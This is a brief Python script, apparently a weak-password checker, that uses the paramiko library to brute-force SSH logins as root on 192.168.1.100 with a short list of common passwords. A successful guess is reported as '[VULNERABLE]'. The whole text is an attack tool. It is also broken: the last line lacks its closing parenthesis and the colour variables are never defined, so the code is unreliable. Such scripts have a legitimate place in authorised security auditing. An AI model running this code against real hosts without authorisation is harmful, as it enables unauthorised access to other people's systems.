import paramiko

def ssh_brute_force(host, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(host, username=username, password=password, timeout=2)
            print(f"{RED}[VULNERABLE]{RESET} SSH login successful: {username}/{password}")
            return
        except paramiko.AuthenticationException:
            print(f"{YELLOW}[FAILED]{RESET} Incorrect password: {password}")
        except:
            print(f"{YELLOW}[ERROR]{RESET} Could not connect to {host}")

passwords = ["123456", "password", "admin", "letmein", "1234"]
ssh_brute_force("192.168.1.100", "root", passwords
